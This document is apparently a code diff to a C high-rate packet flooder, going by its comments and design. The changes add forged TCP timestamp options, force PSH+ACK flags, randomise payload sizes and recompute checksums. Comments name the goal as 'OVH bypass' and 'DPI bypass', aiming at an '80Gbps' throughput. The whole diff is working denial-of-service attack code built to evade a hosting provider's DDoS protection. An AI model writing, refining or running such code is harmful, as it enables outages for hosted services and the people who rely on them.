@@ -1773,8 +1773,9 @@ void *worker_thread(void *arg) {
         #define V17ETH   14
         #define V17IP    20
         #define V17TCP   20
+        #define V17TCP_TS 32
         #define V17PL   1440
-        #define V17FLEN (V17ETH+V17IP+V17TCP+V17PL)
+        #define V17FLEN (V17ETH+V17IP+V17TCP_TS+V17PL)
         #define HUGE_PL_SIZE (1024 * 1024)
         int V17B = 256; // Proven 80Gbps config
 
@@ -1822,6 +1823,7 @@ void *worker_thread(void *arg) {
         unsigned char *slot_tls_ver=calloc(V17B_MAX,sizeof(unsigned char));
         unsigned char *slot_ch_sent=calloc(V17B_MAX,sizeof(unsigned char));
         unsigned int  *slot_tsval=calloc(V17B_MAX,sizeof(unsigned int));
+        unsigned int  *slot_tsecr=calloc(V17B_MAX,sizeof(unsigned int));
         unsigned int  *slot_pl_sum=calloc(V17B_MAX,sizeof(unsigned int));
 
         // Huge Payload Buffer for O(1) random data & DPI bypass
@@ -2106,8 +2108,9 @@ void *worker_thread(void *arg) {
                         unsigned char *op3 = ack_buf+V17ETH+V17IP+20;
                         op3[0]=1; op3[1]=1;
                         op3[2]=8; op3[3]=10;
-                        *((unsigned int*)(op3+4)) = slot_tsval[b];
+                        *((unsigned int*)(op3+4)) = htonl(slot_tsval[b]);
                         *((unsigned int*)(op3+8)) = server_tsval;
+                        slot_tsecr[b] = server_tsval; // Save server TSval for echo in data packets
                         slot_tsval[b]++;
                         ack_opt_len = 12;
                     }
@@ -2241,31 +2244,34 @@ void *worker_thread(void *arg) {
                 unsigned int pl_sum_ch = 0;
                 slot_ch_sent[b] = 1;
 
-                // 1. TCP Flags Randomization (80% ACK, 20% PSH+ACK)
-                unsigned short r_flag = fast_rand() % 100;
-                if(r_flag < 80) {
-                    flags = (5<<12)|0x010; // ACK only
-                    th->psh=0; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                } else {
-                    flags = (5<<12)|0x018; // PSH+ACK
-                    th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
-                }
+                // 100% PSH+ACK — matches real OS behavior, OVH expects this
+                flags = (V17TCP_TS/4)<<12 | 0x018; // doff=8 (32 bytes TCP header), PSH+ACK
+                th->psh=1; th->ack=1; th->rst=0; th->fin=0; th->syn=0; th->urg=0;
+                th->doff = V17TCP_TS/4; // 8 = 32 bytes
+
+                // TCP Timestamps — CRITICAL for OVH bypass (must match SYN options)
+                unsigned char *opt = fr + V17ETH + V17IP + 20;
+                opt[0]=1; opt[1]=1; // NOP, NOP
+                opt[2]=8; opt[3]=10; // Timestamp option kind=8, len=10
+                slot_tsval[b] += 100 + (fast_rand() % 50); // Realistic TSval increment
+                *((unsigned int*)(opt+4)) = htonl(slot_tsval[b]);
+                *((unsigned int*)(opt+8)) = slot_tsecr[b]; // Echo server timestamp
+
+                // Payload Size: 1200-1428 (adjusted for 12-byte TS option overhead)
+                unsigned int raw_pl = 1200 + (fast_rand() % 228);
+                if(raw_pl & 1) raw_pl++; // Keep even for checksum
+                current_pl = raw_pl;
+                tw[6] = htons(flags);
                 
-                    // 2. Payload Size: 1000-1440 (max BPS)
-                    unsigned int raw_pl = 1000 + (fast_rand() % 440);
-                    if(raw_pl & 1) raw_pl++; // Keep even for checksum
-                    current_pl = raw_pl;
-                    tw[6] = htons(flags);
-                    
-                    // 3. High Entropy Payload & O(1) Checksum
-                    unsigned char *pl = fr + V17ETH + V17IP + V17TCP;
-                    unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - current_pl)) & ~1;
-                    memcpy(pl, huge_pl_buf + pl_offset, current_pl);
-                    
-                    pl_sum_ch = huge_pl_sum[(pl_offset + current_pl) / 2] - huge_pl_sum[pl_offset / 2];
+                // High Entropy Payload & O(1) Checksum
+                unsigned char *pl = fr + V17ETH + V17IP + V17TCP_TS;
+                unsigned int pl_offset = (fast_rand() % (HUGE_PL_SIZE - current_pl)) & ~1;
+                memcpy(pl, huge_pl_buf + pl_offset, current_pl);
+                
+                pl_sum_ch = huge_pl_sum[(pl_offset + current_pl) / 2] - huge_pl_sum[pl_offset / 2];
 
                 { // Common send path
-                unsigned int tot_tcp = V17TCP + current_pl;
+                unsigned int tot_tcp = V17TCP_TS + current_pl;
                 unsigned int tot_ip = V17IP + tot_tcp;
                 
                 slot_seq[b] += current_pl;
@@ -2273,7 +2279,7 @@ void *worker_thread(void *arg) {
                 th->ack_seq=htonl(slot_ack[b]);
                 th->source=htons(slot_sp[b]);
                 
-                // 4. TCP Window fixed per connection to match real OS
+                // TCP Window fixed per connection to match real OS
                 th->window=htons(slot_win[b]);
 
                 ih->tot_len=htons(tot_ip);
@@ -2295,10 +2301,14 @@ void *worker_thread(void *arg) {
                 ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
                 ih->check=(unsigned short)~ic;
 
+                // TCP checksum must include TS options (12 bytes = 6 words)
                 th->check=0;
-                unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
+                unsigned short *tw2=(unsigned short*)th;
+                unsigned int cs=tcp_base[b]+tw2[0]+tw2[2]+tw2[3]+tw2[4]+tw2[5]+tw2[7];
                 cs += htons(tot_tcp);
-                cs += tw[6];
+                cs += tw2[6]; // flags
+                // Add TS option words (tw2[10..15] = 12 bytes of NOP+NOP+TS)
+                cs += tw2[10]+tw2[11]+tw2[12]+tw2[13]+tw2[14]+tw2[15];
                 cs += pl_sum_ch;
                 cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
                 th->check=(unsigned short)~cs;
